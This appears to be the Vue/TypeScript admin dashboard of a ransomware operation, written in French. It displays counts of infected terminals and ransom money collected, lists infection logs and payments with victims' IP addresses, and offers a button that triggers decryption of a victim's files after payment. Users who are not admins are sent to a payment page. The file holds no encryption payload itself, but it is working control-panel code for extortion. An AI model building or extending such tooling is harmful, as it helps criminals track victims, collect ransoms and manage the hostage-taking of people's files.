<template>

    <div class="layout_horizontal">
        <Header/>

        <FlashMessage
            v-if="error"
            :type="'error'"
            :message="error"
        />

        <div v-else class="home">

            <FlashMessage
                v-if="email.error || email.message"
                :type="email.error ? 'error' : 'success'"
                :message="email.error ? email.error :  email.message"
            />

            <div>
                <div class="card paragraphe">
                    <div class="grid">
                        <div>
                            <p class="text-center medium">
                                Terminaux&nbsp;infectés&nbsp;
                            </p>
                            <h2 class="text-danger text-center large">{{ infectedTerminals }}</h2>
                            <p class="text-amber text-center small">{{ moment(new Date()).format("L HH:mm") }}</p>
                        </div>
                        <div>
                            <p class="text-center medium">
                                Sous-sous dans les po-poches
                            </p>
                            <h2 class="text-danger text-center large">{{ totalAmount }} €</h2>
                            <p class="text-amber text-center small">{{ moment(new Date()).format("L HH:mm") }}</p>
                        </div>
                    </div>
                </div>
                <div class="grid">
                    <stat-card v-if="infectedFiles.length > 0">
                        <table>
                            <tr v-for="log in infectedFiles" class="paragraphe small">
                                <td>
                                    <span class="text-amber">{{ moment(log.createdAt).format("L HH:mm") }}</span>&nbsp;-&nbsp;
                                </td>
                                <td>
                                    <span class="text-danger">{{ log.numberInfectedFile }}</span>&nbsp;fichiers&nbsp;infectés
                                </td>
                                <td>
                                    &nbsp;&nbsp;ip:&nbsp;<span class="text-success">{{ log.ip }}</span>
                                </td>
                            </tr>
                        </table>
                    </stat-card>
                    <stat-card v-if="payments.length > 0">
                        <table>
                            <tr v-for="log in payments" class="paragraphe small">
                                <td>
                                    <span class="text-amber">{{ moment(log.createdAt).format("L HH:mm") }}</span>&nbsp;-&nbsp;
                                </td>
                                <td>
                                    paiement de <span class="text-danger">{{ log.amount }}&nbsp;€</span>
                                </td>
                                <td>
                                    &nbsp;&nbsp;ip:&nbsp;<span class="text-success">{{ log.user.ip }}</span>
                                </td>
                                <td>
                                    <p v-if="log.paymentStatus === 'payment_success'">
                                        <button class="action-button btn-small dashboard medium" @click.prevent="sendEmail(token, log.id)">Décrypter les fichiers de l'utilisateur</button>
                                    </p>
                                    <p v-if="log.paymentStatus === 'files_decrypted'" class="flash flash--success btn-small dashboard medium">Transaction terminée</p>
                                </td>
                            </tr>
                        </table>
                    </stat-card>
                </div>
            </div>

        </div>
    </div>

</template>

<script lang="ts">
import {defineComponent} from 'vue';
import Header from '../components/commons/Header.vue';
import HttpRequest from '../core/services/http/HttpRequest';
import {isAdmin, isLogged, isTokenExpired} from '../core/services/utils/auth';
import StatCard from "../components/stats/StatCard.vue";
import moment from 'moment'
import FlashMessage from "../components/FlashMessage.vue";

export default defineComponent({
    name: 'Home',
    data() {
        return {
            error: null as string | null,
            token: isLogged(),
            infectedFiles: [],
            payments: [],
            infectedTerminals: 0,
            totalAmount: 0,
            moment: moment,
            email: {
                message: null as string | null,
                error: null as string | null
            }
        }
    },
    components: {
        FlashMessage,
        Header,
        StatCard
    },
    methods: {
        call(token: string | null): void {
            HttpRequest.get('/api/logs', token)
                .then((response: any) => {
                    this.payments = response.data.transactions
                    this.infectedFiles = response.data.logs
                    this.infectedTerminals = response.data.infectedTerminals
                    this.totalAmount = response.data.totalAmount
                    if([400, 404].includes(response.data.status_code)) {
                        this.$router.push('/*')
                    }
                })
                .catch((error: any) => {
                    this.error = error;
                });
        },
        sendEmail(token: string | null, id: number): void {
            HttpRequest.get('/api/decrypt/'+id, token)
                .then((res: any) => {
                    if(res.data.error) {
                        this.email.error = res.data.message;
                    } else {
                        this.email.message = res.data.message
                    }
                }).catch((error: any) => {
                    this.email.error = error;
                });
        }
    },
    created() {

        if (this.token) {
            isTokenExpired(this.token);
            if(!isAdmin(this.token)) {
                this.$router.push('/payment');
            } else {
                this.call(this.token);
            }
        } else {
            this.$router.push('/login')
        }
    }
});
</script>

<style lang="scss" scoped>
// Your scoped scss
</style>
